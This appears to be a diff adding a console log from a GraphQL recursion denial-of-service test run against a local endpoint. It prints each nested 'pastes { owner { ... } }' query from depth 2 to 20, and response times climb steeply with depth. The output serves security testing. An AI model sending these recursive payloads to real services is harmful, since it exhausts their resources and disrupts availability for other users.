@@ -1,0 +1,52 @@
+n> python .\DoS_RecursionAutomatic.py -u http://localhost:5013/graphql -c pastes owner
+
+
+Testing recursion: pastes -> owner
+Depths 2-20 (step 2) with timeout=10.0s and threshold=5.0s
+
+
+------------------------------------------------------------
+
+
+
+The following query was build:query recursiveTest { pastes { owner { __typename } } }
+[OK]   Depth 2 completed in 0.04s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { __typename } } } } }
+[OK]   Depth 4 completed in 0.03s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } }
+[OK]   Depth 6 completed in 0.03s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } }
+[OK]   Depth 8 completed in 0.08s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } }
+[OK]   Depth 10 completed in 0.10s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } } } }
+[OK]   Depth 12 completed in 0.17s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } } } } } }
+[OK]   Depth 14 completed in 0.31s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } } } } } } } }
+[OK]   Depth 16 completed in 0.61s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } } } } } } } } } }
+[OK]   Depth 18 completed in 1.21s (HTTP 200)
+
+The following query was build:query recursiveTest { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { pastes { owner { __typename } } } } } } } } } } } } } } } } } } } } }
+[OK]   Depth 20 completed in 2.44s (HTTP 200)
+
+Summary:
+Depth   2: OK in 0.04s (HTTP 200)
+Depth   4: OK in 0.03s (HTTP 200)
+Depth   6: OK in 0.03s (HTTP 200)
+Depth   8: OK in 0.08s (HTTP 200)
+Depth  10: OK in 0.10s (HTTP 200)
+Depth  12: OK in 0.17s (HTTP 200)
+Depth  14: OK in 0.31s (HTTP 200)
+Depth  16: OK in 0.61s (HTTP 200)
+Depth  18: OK in 1.21s (HTTP 200)
+Depth  20: OK in 2.44s (HTTP 200)
